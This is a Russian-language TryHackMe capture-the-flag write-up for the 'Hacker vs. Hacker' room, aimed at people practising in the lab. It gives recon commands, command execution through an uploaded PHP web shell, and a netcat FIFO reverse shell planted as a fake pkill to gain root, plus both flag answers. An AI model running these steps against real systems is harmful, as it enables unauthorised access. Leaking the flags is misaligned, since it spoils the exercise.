[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Hacker vs. Hacker](https://tryhackme.com/r/room/hackervshacker) 

Всего 1 заданиe:
## Задание 1
Сервер этой рекрутинговой компании, похоже, был взломан, и хакер свел на нет все попытки администраторов починить машину. Они не могут ее выключить (они потеряют SEO!), так что, может быть, вы сможете помочь?
### Ответьте на вопросы ниже
Что такое флаг user.txt?
```commandline
nmap -sC -sV <IP>
gobuster dir --url http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 32 -x txt,php,html
# http://<IP>/upload.php
# http://<IP>/cvs/shell.pdf.php
http://<IP>/cvs/shell.pdf.php?cmd=whoami
http://<IP>/cvs/shell.pdf.php?cmd=cat /home/lachlan/user.txt
ssh lachlan@<IP>

```
```commandline
thm{af7e46b68081d4025c5ce10851430617}
```
Что такое флаг proof.txt?
```commandline
http://<IP>/cvs/shell.pdf.php?cmd=ls -la /home/lachlan
http://<IP>/cvs/shell.pdf.php?cmd=cat /home/lachlan/.bash_history
http://<IP>/cvs/shell.pdf.php?cmd=cat /etc/cron.d/persistence
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <my_own_IP> 1234 >/tmp/f" > /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill
nc -lvnp 1234
cat /root/root.txt
```
```commandline
thm{7b708e5224f666d3562647816ee2a1d4}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)